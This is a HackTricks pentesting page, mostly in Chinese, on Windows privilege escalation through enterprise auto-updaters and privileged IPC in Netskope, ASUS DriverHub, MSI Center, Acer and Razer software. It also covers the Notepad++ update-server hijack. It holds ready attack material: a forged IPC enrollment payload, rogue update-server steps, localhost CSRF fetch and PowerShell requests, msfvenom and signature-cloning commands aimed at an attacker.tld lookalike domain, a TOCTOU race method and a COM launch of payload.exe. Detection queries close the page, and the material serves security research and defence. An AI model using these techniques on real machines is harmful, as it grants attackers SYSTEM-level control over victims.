# 滥用企业 Auto-Updaters 和 特权 IPC（例如 Netskope、ASUS & MSI）

{{#include ../../banners/hacktricks-training.md}}

本页概述了一类出现在企业 endpoint agents 和 updaters 中的 Windows 本地提权链，这些组件暴露了低摩擦的 IPC 接口和一个特权更新流程。一个具有代表性的示例是 Netskope Client for Windows < R129 (CVE-2025-0309)，其中低权限用户可以被强制重新注册到攻击者控制的服务器，然后交付一个由 SYSTEM 服务安装的恶意 MSI。

可以在类似产品上复用的关键思路：
- 滥用特权服务的 localhost IPC 强制重新注册或重新配置到攻击者服务器。
- 实现厂商的 update endpoints，安装一个恶意的 Trusted Root CA，并将 updater 指向一个恶意的“已签名”包。
- 绕过弱的 signer 检查（CN allow-lists）、可选的 digest 标志，以及宽松的 MSI properties。
- 如果 IPC 是“encrypted”的话，从存储在 registry 的对所有人可读的机器标识符推导出 key/IV。
- 如果服务通过 image path/process name 限制调用者，注入到 allow-listed 的进程，或以 suspended 启动该进程并通过最小的 thread-context patch 引导你的 DLL。

---
## 1) 通过 localhost IPC 强制注册到攻击者服务器

许多 agent 包含一个用户模式的 UI 进程，通过 localhost TCP 使用 JSON 与以 SYSTEM 运行的服务通信。

在 Netskope 中观察到：
- UI: stAgentUI (低完整性) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

利用流程：
1) 构造一个 JWT enrollment token，其 claims 控制后端主机（例如 AddonUrl）。使用 alg=None 以免需要签名。
2) 发送 IPC 消息以调用 provisioning 命令，并附上你的 JWT 和 租户名称（tenant name）：
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) 服务开始向你的恶意服务器请求 enrollment/config，例如：
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- 如果调用方验证是基于路径/名称的，请从白名单中的厂商二进制文件发起请求（见 §4）。

---
## 2) 劫持更新通道以 SYSTEM 身份运行代码

一旦客户端与您的服务器通信，实现期望的端点并将其引导到攻击者的 MSI。典型流程：

1) /v2/config/org/clientconfig → 返回 JSON 配置，设置非常短的 updater 间隔，例如：
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → 返回一个 PEM CA 证书。该服务将其安装到本地计算机受信任的根证书存储（Local Machine Trusted Root store）。
3) /v2/checkupdate → 提供指向恶意 MSI 和伪造版本的元数据。

绕过野外常见的检查：
- Signer CN allow-list：服务可能仅检查 Subject CN 等于 “netSkope Inc” 或 “Netskope, Inc.”。你的伪造 CA 可以签发带有该 CN 的 leaf 并签署 MSI。
- CERT_DIGEST property：包含一个名为 CERT_DIGEST 的良性 MSI 属性。安装时不强制执行。
- Optional digest enforcement：配置标志（例如 check_msi_digest=false）会禁用额外的加密验证。

结果：SYSTEM 服务会从
C:\ProgramData\Netskope\stAgent\data\*.msi
安装你的 MSI，并以 NT AUTHORITY\SYSTEM 身份执行任意代码。

---
## 3) Forging encrypted IPC requests (when present)

从 R127 开始，Netskope 将 IPC JSON 包装在看起来像 Base64 的 encryptData 字段中。逆向显示使用的是 AES，key/IV 从任何用户都可读的注册表值派生：
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

攻击者可以重现该加密并以标准用户身份发送有效的加密命令。通用提示：如果某个 agent 突然“加密”了它的 IPC，请在 HKLM 下查找 device IDs、product GUIDs、install IDs 等作为加密材料。

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

一些服务通过解析 TCP 连接的 PID 并将 image path/name 与位于 Program Files 下的厂商白名单二进制（例如 stagentui.exe、bwansvc.exe、epdlp.exe）进行比较来认证对端。

两个实用的绕过方法：
- 对一个在白名单内的进程（例如 nsdiag.exe）进行 DLL 注入，并从内部代理 IPC。
- 启动一个被挂起的白名单二进制并引导你的代理 DLL，而不使用 CreateRemoteThread（见 §5），以满足驱动强制的防篡改规则。

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

产品通常随附一个 minifilter/OB callbacks 驱动（例如 Stadrv），用以从指向受保护进程的句柄中剥离危险权限：
- Process: 移除 PROCESS_TERMINATE、PROCESS_CREATE_THREAD、PROCESS_VM_READ、PROCESS_DUP_HANDLE、PROCESS_SUSPEND_RESUME
- Thread: 限制为 THREAD_GET_CONTEXT、THREAD_QUERY_LIMITED_INFORMATION、THREAD_RESUME、SYNCHRONIZE

一个可靠且遵守这些约束的 user-mode loader：
1) 使用 CREATE_SUSPENDED 对一个厂商二进制调用 CreateProcess。
2) 获取你仍被允许的句柄：对进程为 PROCESS_VM_WRITE | PROCESS_VM_OPERATION，及一个具有 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT 的线程句柄（或者如果你在已知 RIP 处修补代码，只需 THREAD_RESUME）。
3) 用一个极小的存根覆盖 ntdll!NtContinue（或其他早期、保证映射的 thunk），该存根调用 LoadLibraryW 加载你的 DLL 路径，然后跳回。
4) ResumeThread 触发进程内的存根，加载你的 DLL。

因为你并未在已受保护的进程上使用 PROCESS_CREATE_THREAD 或 PROCESS_SUSPEND_RESUME（你是创建它的），驱动的策略得以满足。

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) 自动化生成 rogue CA、恶意 MSI 签名，并提供所需端点：/v2/config/org/clientconfig、/config/ca/cert、/v2/checkupdate。
- UpSkope 是一个自定义 IPC 客户端，可构造任意（可选 AES 加密的）IPC 消息，并包含来自白名单二进制的挂起进程注入功能。

## 7) Fast triage workflow for unknown updater/IPC surfaces

当面对新的 endpoint agent 或主板“helper”套件时，快速流程通常足以判断是否是一个有前景的 privesc 目标：

1) 枚举 loopback 监听并将其映射回厂商进程：
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) 枚举候选 named pipes:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) 挖掘基于注册表的路由数据，这些数据被基于插件的 IPC 服务器使用：
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) 首先从 user-mode client 提取 endpoint names、JSON keys 和 command IDs。打包的 Electron/.NET 前端经常 leak 完整的 schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
如果目标只通过 PID、image path 或 process name 来验证调用者，把这当作一个减速带而不是边界：注入到合法客户端，或从被允许的进程发起连接，通常就足以满足服务器的检查。针对 named pipes，[this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) covers the primitive in more depth。

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub 在 127.0.0.1:53000 上部署了一个用户模式 HTTP 服务 (ADU.exe)，该服务期望来自 https://driverhub.asus.com 的浏览器调用。The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`。因此，任何攻击者控制的主机，例如 `https://driverhub.asus.com.attacker.tld`，都能通过检查并可以从 JavaScript 发出会改变状态的请求。See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns。

Practical flow:
1) Register a domain that embeds `.asus.com` and host a malicious webpage there.
2) Use `fetch` or XHR to call a privileged endpoint (e.g., `Reboot`, `UpdateApp`) on `http://127.0.0.1:53000`.
3) Send the JSON body expected by the handler – the packed frontend JS shows the schema below.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
即使将 Origin header 伪造为受信任的值，下面显示的 PowerShell CLI 也会成功：
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
因此，任何浏览器访问攻击者站点都会变成一次 1-click（或通过 `onload` 的 0-click）本地 CSRF，从而触发一个 SYSTEM helper。

---
## 2) 不安全的代码签名验证与证书克隆 (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` 会下载 JSON body 中定义的任意可执行文件并将其缓存到 `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`。下载 URL 验证重用相同的子字符串逻辑，因此 `http://updates.asus.com.attacker.tld:8000/payload.exe` 会被接受。下载后，ADU.exe 只检查 PE 是否包含签名且 Subject 字符串是否匹配 ASUS，然后运行它 —— 不使用 `WinVerifyTrust`，也不做链验证。

要武器化该流程：
1) 创建 payload（例如 `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`）。
2) 将 ASUS 的签名者克隆到其中（例如 `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`）。
3) 在一个 `.asus.com` 伪装域上托管 `pwn.exe`，并通过上文的浏览器 CSRF 触发 UpdateApp。

由于 Origin 和 URL 过滤器均基于子字符串且签名者检查仅做字符串比较，DriverHub 会在其提权上下文中拉取并执行攻击者的二进制。

---
## 1) 更新器复制/执行路径中的 TOCTOU（MSI Center CMD_AutoUpdateSDK）

MSI Center 的 SYSTEM 服务暴露了一个 TCP 协议，每个帧为 `4-byte ComponentID || 8-byte CommandID || ASCII arguments`。核心组件（Component ID `0f 27 00 00`）包括 `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`。其处理流程：
1) 将提供的可执行文件复制到 `C:\Windows\Temp\MSI Center SDK.exe`。
2) 通过 `CS_CommonAPI.EX_CA::Verify` 验证签名（证书 Subject 必须等于 “MICRO-STAR INTERNATIONAL CO., LTD.” 并且 `WinVerifyTrust` 成功）。
3) 创建一个计划任务，以 SYSTEM 身份运行该临时文件，并使用攻击者可控的参数。

复制的文件在验证与 `ExecuteTask()` 之间没有被锁定。攻击者可以：
- 发送指向合法 MSI 签名二进制的 Frame A（保证签名检查通过并且任务被排队）。
- 用重复的 Frame B 消息与其竞争，指向恶意 payload，在验证完成后立即覆盖 `MSI Center SDK.exe`。

当调度器触发时，它会在 SYSTEM 下执行已被覆盖的 payload，尽管之前验证的是原始文件。可靠的利用使用两个 goroutine/线程不停地发送 CMD_AutoUpdateSDK，直到赢得 TOCTOU 时间窗口。

---
## 2) 滥用自定义 SYSTEM 级别的 IPC 与模拟 (MSI Center + Acer Control Centre)

### MSI Center TCP 命令集
- `MSI.CentralServer.exe` 加载的每个插件/DLL 都会收到一个存储在 `HKLM\SOFTWARE\MSI\MSI_CentralServer` 下的 Component ID。帧的前 4 字节选择该组件，允许攻击者将命令路由到任意模块。
- 插件可以定义自己的任务运行器。`Support\API_Support.dll` 暴露 `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` 并直接调用 `API_Support.EX_Task::ExecuteTask()`，**不做签名验证** —— 任何本地用户都可以将其指向 `C:\Users\<user>\Desktop\payload.exe` 并确定性地获得 SYSTEM 执行。
- 使用 Wireshark 捕获环回流量或在 dnSpy 中对 .NET 二进制进行动态分析可以快速揭示 Component ↔ command 的映射；随后可用自定义的 Go/ Python 客户端重放这些帧。

### Acer Control Centre 命名管道与模拟等级
- `ACCSvc.exe` (SYSTEM) 暴露 `\\.\pipe\treadstone_service_LightMode`，其可自由控制的 ACL 允许远程客户端（例如 `\\TARGET\pipe\treadstone_service_LightMode`）访问。发送带有文件路径的命令 ID `7` 会调用服务的进程生成例程。
- 客户端库将一个魔术终止字节（113）与参数一并序列化。使用 Frida/`TsDotNetLib` 进行动态插桩（有关插桩技巧，参见 [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)）表明本地处理器在调用 `CreateProcessAsUser` 之前会将该值映射到一个 `SECURITY_IMPERSONATION_LEVEL` 和完整性 SID。
- 将 113 (`0x71`) 换为 114 (`0x72`) 会进入通用分支，该分支保留完整的 SYSTEM token 并设置高完整性 SID（`S-1-16-12288`）。因此被生成的二进制以不受限制的 SYSTEM 运行，无论是本地还是跨机器。
- 将其与暴露的安装器标志 (`Setup.exe -nocheck`) 结合，即使在实验室 VM 上也能安装 ACC 并在不用厂商硬件的情况下测试该管道。

这些 IPC 漏洞强调了本地主机服务必须强制执行相互认证（ALPC SIDs、`ImpersonationLevel=Impersonation` 过滤、令牌过滤）的必要性，以及每个模块的“运行任意二进制”帮助程序为何必须共享相同的签名验证。

---
## 3) 基于弱用户态验证的 COM/IPC “elevator” 帮助程序（Razer Synapse 4）

Razer Synapse 4 为该类问题添加了另一个常见模式：低权限用户可以通过 `RzUtility.Elevator` 请求 COM 帮助程序启动进程，而信任决策被委托给用户态 DLL（`simple_service.dll`），而不是在特权边界内被严格强制。

观察到的利用路径：
- 实例化 COM 对象 `RzUtility.Elevator`。
- 调用 `LaunchProcessNoWait(<path>, "", 1)` 请求提权启动。
- 在公开的 PoC 中，`simple_service.dll` 内的 PE 签名门被在发出请求前打补丁移除，从而允许启动任意攻击者选择的可执行文件。

最小化的 PowerShell 调用：
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
General takeaway: when reversing “helper” suites, do not stop at localhost TCP or named pipes. Check for COM classes with names such as `Elevator`, `Launcher`, `Updater`, or `Utility`, then verify whether the privileged service actually validates the target binary itself or merely trusts a result computed by a patchable user-mode client DLL. This pattern generalizes beyond Razer: any split design where the high-privilege broker consumes an allow/deny decision from the low-privilege side is a candidate privesc surface.

---
## 通过弱更新验证进行的远程供应链劫持 (WinGUp / Notepad++)

基于较旧 WinGUp 的 Notepad++ 更新程序未能完整验证更新的真实性。当攻击者入侵更新服务器的托管提供商时，他们可以篡改 XML 清单，并仅将被选客户重定向到攻击者的 URL。由于客户端接受任何 HTTPS 响应而不同时强制要求受信任的证书链和有效的 PE 签名，受害者会下载并执行被特洛伊化的 NSIS `update.exe`。

操作流程（不需要本地漏洞）：
1. **基础设施拦截**：入侵 CDN/托管并用指向恶意下载 URL 的攻击者元数据响应更新检查。
2. **特洛伊化 NSIS**：安装程序获取/执行载荷并滥用两种执行链：
- **Bring-your-own signed binary + sideload**：捆绑已签名的 Bitdefender `BluetoothService.exe` 并在其搜索路径中放置恶意的 `log.dll`。当签名二进制运行时，Windows 会 sideload `log.dll`，该 DLL 解密并反射加载 Chrysalis 后门（Warbird-protected + API hashing to hinder static detection）。
- **Scripted shellcode injection**：NSIS 执行一个已编译的 Lua 脚本，使用 Win32 APIs（例如 `EnumWindowStationsW`）注入 shellcode 并部署 Cobalt Strike Beacon。

Hardening/detection takeaways for any auto-updater:
- Enforce **certificate + signature verification** of the downloaded installer (pin vendor signer, reject mismatched CN/chain) and sign the update manifest itself (e.g., XMLDSig). Block manifest-controlled redirects unless validated.
- Treat **BYO signed binary sideloading** as a post-download detection pivot: alert when a signed vendor EXE loads a DLL name from outside its canonical install path (e.g., Bitdefender loading `log.dll` from Temp/Downloads) and when an updater drops/executes installers from temp with non-vendor signatures.
- Monitor **malware-specific artifacts** observed in this chain (useful as generic pivots): mutex `Global\Jdhfv_1.0.1`, anomalous `gup.exe` writes to `%TEMP%`, and Lua-driven shellcode injection stages.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> 启动非 Notepad++ 安装程序</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

这些模式可推广到任何接受未签名清单或未对安装程序签名者进行固定(pin)的更新程序——网络劫持 + 恶意安装程序 + 自带签名的旁加载，会以“受信任”更新的幌子导致远程代码执行。

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
